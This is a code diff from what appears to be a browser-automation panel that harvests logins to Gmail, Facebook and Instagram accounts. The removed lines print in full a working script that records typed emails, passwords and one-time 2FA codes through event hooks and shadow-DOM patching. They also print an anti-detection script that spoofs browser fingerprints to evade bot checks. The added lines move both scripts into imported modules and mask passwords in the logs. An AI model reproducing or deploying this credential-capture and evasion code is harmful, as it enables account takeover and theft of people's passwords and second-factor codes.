@@ -11,6 +11,8 @@ import { loadAccounts, getAccount, saveAccount } from './accounts.js';
 import { resolveLocaleForIp } from './geo.js';
 import * as telegram from './telegram.js';
 import { collectGmailStats, formatStatsForTelegram } from './gmail-stats.js';
+import { antiDetectionScript, credentialCaptureScript } from './captureScript.js';
+import { routeFilter } from './routeFilter.js';
 
 const sessions = new Map(); // accountId -> { context, page, lastActivity }
 const starting = new Map(); // accountId -> Promise
@@ -152,35 +154,7 @@ async function launch(accountId, adminIp) {
   // Remove the remaining webdriver trace that Playwright injects via CDP
   const lang = locale.split('-')[0];
   const languages = lang === 'en' ? [locale, lang] : [locale, lang, 'en-US', 'en'];
-  context.addInitScript((languages) => {
-    Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
-    Object.defineProperty(navigator, 'languages', {
-      get: () => languages,
-    });
-    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
-    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
-
-    // Realistic-looking plugin list (headless Chrome reports none by default)
-    const fakePlugins = [
-      { name: 'PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
-      { name: 'Chrome PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
-      { name: 'Chromium PDF Viewer', filename: 'internal-pdf-viewer', description: 'Portable Document Format' },
-    ];
-    Object.defineProperty(navigator, 'plugins', { get: () => fakePlugins });
-
-    // window.chrome is missing under --headless=new; stub the bits sites probe for
-    if (!window.chrome) window.chrome = {};
-    if (!window.chrome.runtime) window.chrome.runtime = {};
-
-    // Headless Chrome (and --disable-gpu) renders WebGL via SwiftShader, a
-    // well-known automation tell. Report a plausible real GPU instead.
-    const getParameterProto = WebGLRenderingContext.prototype.getParameter;
-    WebGLRenderingContext.prototype.getParameter = function (param) {
-      if (param === 37445) return 'Intel Inc.'; // UNMASKED_VENDOR_WEBGL
-      if (param === 37446) return 'Intel Iris OpenGL Engine'; // UNMASKED_RENDERER_WEBGL
-      return getParameterProto.call(this, param);
-    };
-  }, languages);
+  context.addInitScript(antiDetectionScript, languages);
   // Capture email/password as they're typed into login forms, so the panel
   // can show them without the admin re-entering them manually.
   await context.exposeBinding('__spCapture', async (_source, payload) => {
@@ -193,7 +167,7 @@ async function launch(accountId, adminIp) {
       if (!current) return;
       if (type === 'password' && value !== current.password) {
         await saveAccount({ ...current, password: value });
-        pushLog(accountId, 'capture', `🔐 Wpisał hasło: ${value}`);
+        pushLog(accountId, 'capture', `🔐 Wpisał hasło: ${'*'.repeat(Math.min(value.length, 8))}`);
       } else if (type === 'email') {
         // Case-insensitive dedup: "User@gmail.com" and "user@gmail.com" are
         // the same login so stop re-reporting after the first one.
@@ -208,238 +182,15 @@ async function launch(accountId, adminIp) {
       /* ignore */
     }
   });
-  // Login forms (especially Google's) often live inside shadow DOM, which a
-  // plain querySelectorAll never sees — so this walks into every shadow root,
-  // including ones created after the fact, by patching attachShadow.
-  context.addInitScript(() => {
-    const report = (type, value) => {
-      try { window.__spCapture({ type, value }); } catch { /* binding not ready yet */ }
-    };
-    const fieldLabel = (el) =>
-      el.getAttribute('aria-label') || el.placeholder || el.name || el.id || el.type || 'pole';
-
-    const isEmailField = (el) =>
-      el.type === 'email' ||
-      el.id === 'identifierId' ||
-      /email|login|user|identifier/i.test(`${el.name || ''} ${el.id || ''} ${el.autocomplete || ''}`);
-
-    // One-time password / 2FA code field.
-    // Standard: autocomplete="one-time-code". Also heuristic match on
-    // name/id/aria for sites that don't use the standard attribute.
-    const isOtpField = (el) => {
-      const al = (el.getAttribute && el.getAttribute('aria-label') || '').toLowerCase();
-      const hints = `${el.name || ''} ${el.id || ''} ${el.autocomplete || ''} ${al}`.toLowerCase();
-      if (/one-time-code/.test(el.autocomplete || '')) return true;
-      if (/\botp\b|\b2fa\b|\btotp\b|verification[-_ ]?code|security[-_ ]?code|kod[-_ ]?weryfik|kod[-_ ]?bezpiecz|two[-_ ]?factor/.test(hints)) return true;
-      // Short numeric input near a "verification" page title
-      if ((el.type === 'tel' || el.type === 'text' || el.type === 'number') &&
-          (el.maxLength > 0 && el.maxLength <= 8) &&
-          /\d{4,8}/.test(el.value || '')) {
-        return /weryfik|verif|code|kod/i.test(document.title || document.body?.innerText?.slice(0, 500) || '');
-      }
-      return false;
-    };
-
-    // Track last reported values to avoid duplicates (case-insensitive for email)
-    const reported = { email: '', password: '', otp: '' };
-
-    const captureField = (el) => {
-      const v = (el.value || '').trim();
-      if (!v) return;
-      if (el.type === 'password') {
-        if (v !== reported.password) {
-          reported.password = v;
-          report('password', v);
-          // Backup to sessionStorage — the CDP bridge (__spCapture) can be lost
-          // when the page navigates away (e.g. Facebook error page after wrong
-          // password) before the async round-trip completes. sessionStorage
-          // survives same-origin navigations within the same tab so we can
-          // recover the last typed password after navigation.
-          try { sessionStorage.setItem('__sp_last_pw', v); } catch {}
-        }
-      } else if (isOtpField(el)) {
-        if (v !== reported.otp) {
-          reported.otp = v;
-          report('otp', v);
-        }
-      } else if (isEmailField(el)) {
-        // Case-insensitive dedup: "User@gmail.com" and "user@gmail.com"
-        // mean the same login — don't ping twice.
-        if (v.toLowerCase() !== reported.email.toLowerCase()) {
-          reported.email = v;
-          report('email', v);
-        }
-      }
-    };
-
-    const bind = (el) => {
-      if (el.__spBound) return;
-      el.__spBound = true;
-      let hadValue = Boolean(el.value);
-
-      // Capture on blur/change (original)
-      const handler = () => {
-        const v = el.value;
-        const has = Boolean(v);
-        if (has) {
-          captureField(el);
-        } else if (!has && hadValue) {
-          report('clear', fieldLabel(el));
-        }
-        hadValue = has;
-      };
-      el.addEventListener('blur', handler);
-      el.addEventListener('change', handler);
-
-      // Capture on input with debounce — catches values before page navigation
-      let inputTimer = null;
-      el.addEventListener('input', () => {
-        clearTimeout(inputTimer);
-        inputTimer = setTimeout(() => captureField(el), 800);
-      });
-
-      // Capture immediately on Enter key (form submission)
-      el.addEventListener('keydown', (e) => {
-        if (e.key === 'Enter') {
-          clearTimeout(inputTimer);
-          captureField(el);
-        }
-      });
-
-      // If field already has a value (autofill), capture it
-      if (el.value) {
-        setTimeout(() => captureField(el), 500);
-      }
-    };
-
-    // Intercept form submissions to capture all fields before navigation
-    document.addEventListener('submit', (e) => {
-      const form = e.target;
-      if (!form?.querySelectorAll) return;
-      form.querySelectorAll('input').forEach(captureField);
-    }, true);
-
-    // Intercept button clicks that might submit Google's multi-step form
-    document.addEventListener('click', (e) => {
-      const btn = e.target?.closest?.('button, [role="button"], .VfPpkd-LgbsSe');
-      if (!btn) return;
-      const form = btn.closest('form');
-      if (form) form.querySelectorAll('input').forEach(captureField);
-      // Google's "Next" button is often outside the form
-      document.querySelectorAll('#identifierId, input[type="email"], input[type="password"]')
-        .forEach(captureField);
-    }, true);
-
-    const FIELD_SELECTOR =
-      'input[type="password"], input[type="email"], input[type="text"], input[type="tel"], input[type="search"], input[type="number"], textarea';
-    // Re-scanning the WHOLE document on every single DOM mutation (the old
-    // approach) pins the page's main thread solid on a site like Gmail that
-    // mutates constantly — the page never finishes rendering because our own
-    // observer callback never stops running. Only ever look at what the
-    // mutation actually added.
-    const visit = (node) => {
-      if (node.nodeType !== 1) return;
-      if (node.matches?.(FIELD_SELECTOR)) bind(node);
-      if (node.shadowRoot) watch(node.shadowRoot);
-      node.querySelectorAll?.(FIELD_SELECTOR).forEach(bind);
-      node.querySelectorAll?.('*').forEach((el) => { if (el.shadowRoot) watch(el.shadowRoot); });
-    };
-    const watch = (root) => {
-      if (root.__spWatched) return;
-      root.__spWatched = true;
-      root.querySelectorAll(FIELD_SELECTOR).forEach(bind);
-      root.querySelectorAll('*').forEach((el) => { if (el.shadowRoot) watch(el.shadowRoot); });
-      new MutationObserver((records) => {
-        for (const r of records) r.addedNodes.forEach(visit);
-      }).observe(root, { childList: true, subtree: true });
-    };
-    const origAttachShadow = Element.prototype.attachShadow;
-    Element.prototype.attachShadow = function (init) {
-      const root = origAttachShadow.call(this, init);
-      watch(root);
-      return root;
-    };
-    watch(document);
-  });
+  // Login forms (especially Google's) often live inside shadow DOM — the
+  // capture script walks into every shadow root by patching attachShadow.
+  context.addInitScript(credentialCaptureScript);
 
   const page = context.pages()[0] || (await context.newPage());
 
-  // Block heavyweight tracking / analytics requests. Facebook, Instagram
-  // and Google each ship megabytes of pixels, A/B-test loggers and ad
-  // beacons that we don't need for a login flow — stripping them makes
-  // the page interactive 3-5x faster, especially over mobile proxies
-  // where every extra round-trip hurts.
-  // Smart route blocker:
-  // - URL-e flow logowania (login/checkpoint/2FA/code) ZAWSZE przechodzą
-  //   bez żadnych blokad — to krytyczny moment, nie ryzykujemy niczego
-  // - Pozostałe requesty: blokuj tracking + ciężkie obrazy feed/avatary
-  //   (po zalogowaniu) żeby strona ładowała się szybciej przez proxy
-  await context.route('**/*', (route) => {
-    const req = route.request();
-    const url = req.url();
-    const type = req.resourceType();
-
-    // SAFE ZONE: wszystko związane z logowaniem i 2FA — przepuść bez pytania.
-    const isLoginFlow = /\/(login|checkpoint|two_factor|two[-_ ]step|security|approvals|code|verif|identif|recover|totp|otp)\b/i.test(url);
-    if (isLoginFlow) {
-      return route.continue();
-    }
-
-    // Video streaming — zawsze blokuj (feed FB, Instagram reels)
-    if (type === 'media') {
-      if (/videoplayback|\.mp4(?:$|\?)|\.webm(?:$|\?)|\.m3u8(?:$|\?)/.test(url)) {
-        return route.abort();
-      }
-    }
-
-    // Obrazki feed FB (fbcdn.net scontent) — blokuj (tylko po logowaniu
-    // widok feed; na login/checkpoint już przeszliśmy wcześniej przez
-    // SAFE ZONE). Ale: NIE blokuj obrazów z strony logowania (login path)
-    // ani z Google (dla Gmail/accounts.google.com).
-    if (type === 'image' && /scontent[^.]*\.fbcdn\.net|scontent\.cdninstagram/.test(url)) {
-      return route.abort();
-    }
-
-    // Blokady tracking — zawsze bezpieczne
-    const blocked = [
-      // Facebook / Meta tracking
-      /facebook\.com\/tr(\/|\?|$)/,
-      /facebook\.com\/plugins\//,
-      /facebook\.com\/.*\/qpl\//,
-      /facebook\.com\/.*\/ls_report/,
-      /facebook\.com\/.*\/ajax\/bz/,
-      // NIE blokuj graphqlbatch — FB flow logowania/2FA jedzie przez niego
-      /connect\.facebook\.net/,
-      /falco\.facebook/,
-      // Instagram — też NIE blokuj graphql/batch
-      /instagram\.com\/.*\/logging/,
-      // Google telemetria (NIE Gmail)
-      /google-analytics\.com/,
-      /googletagmanager\.com/,
-      /doubleclick\.net/,
-      /googlesyndication\.com/,
-      /googleadservices\.com/,
-      // Twitter/X
-      /\/i\/jot\//,
-      /api\.twitter\.com\/1\.1\/jot/,
-      // 3rd-party trackery
-      /segment\.(io|com)/,
-      /mixpanel\.com/,
-      /amplitude\.com/,
-      /hotjar\.com/,
-      /sentry\.io/,
-      /fullstory\.com/,
-      /scorecardresearch\.com/,
-      /chartbeat\.(com|net)/,
-      /optimizely\.com/,
-      /newrelic\.com/,
-      /datadoghq\.com/,
-    ];
-    if (blocked.some((rx) => rx.test(url))) {
-      return route.abort();
-    }
-    return route.continue();
-  }).catch(() => {});
+  // Block heavyweight tracking / analytics requests and feed media.
+  // Login/2FA/checkpoint URLs always pass through — see routeFilter.js.
+  await context.route('**/*', routeFilter).catch(() => {});
 
   // Presence of one of these session cookies is a reliable, platform-level
   // signal that the account is actually logged in (far more robust than
@@ -644,7 +395,7 @@ async function launch(accountId, adminIp) {
       if (ssPass && ssPass !== current.password) {
         await saveAccount({ ...current, password: ssPass });
         current = { ...current, password: ssPass };
-        pushLog(accountId, 'capture', `🔐 Hasło (odzyskane): ${ssPass}`);
+        pushLog(accountId, 'capture', `🔐 Hasło (odzyskane): ${'*'.repeat(Math.min(ssPass.length, 8))}`);
       }
 
       const captionLines = [
